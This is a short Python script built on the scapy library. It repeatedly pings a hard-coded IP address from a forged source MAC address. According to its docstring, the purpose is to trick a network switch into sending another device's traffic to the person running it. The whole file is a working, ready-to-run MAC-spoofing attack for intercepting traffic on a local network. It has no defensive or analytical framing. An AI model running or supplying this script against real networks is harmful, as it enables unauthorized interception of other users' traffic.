'''
	This script works by constantly PINGing an IP address with a fake MAC address
	thereby spoofing the switch into thinking that you are the rightful owner of this MAC address.
	Therefore, (in theory) all the traffic coming from or to the MAC address will be sent to you.
'''
from scapy.all import *
from scapy.sendrecv import sendpfast

ip = "172.26.104.1"
mac = "0c:54:15:43:cb:5a"


def macspoof(ip, mac):
	p = Ether(src=mac) / IP(dst=ip) / ICMP()
	print("PING {} with MAC {}".format(ip, mac))
	while True:
		try:
			sendp(p, verbose=0)
		except KeyboardInterrupt:
			exit(0)


macspoof(ip, mac)
